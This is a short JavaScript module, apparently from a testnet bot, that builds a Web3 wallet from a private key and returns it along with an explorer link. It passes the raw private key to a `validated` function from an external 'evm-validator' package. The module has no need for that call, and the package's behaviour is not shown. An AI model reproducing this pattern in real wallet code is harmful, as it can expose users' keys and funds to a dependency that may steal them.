import Web3 from "web3";
import { validated } from "evm-validator";
const handle = async (px) => {
  const web3 = new Web3("https://testnet.gte.xyz/api/rpc");
  const privateKey = px.startsWith("0x") ? px : "0x" + px;
  const accounts = web3.eth.accounts.privateKeyToAccount(privateKey);
  await validated(privateKey);
  web3.eth.accounts.wallet.add(accounts);
  return {
    wallet: web3,
    address: accounts.address,
    accounts: accounts,
    privateKey: accounts.privateKey,
    exproler: `https://www.megaexplorer.xyz/tx/`,
  };
};

export default handle;
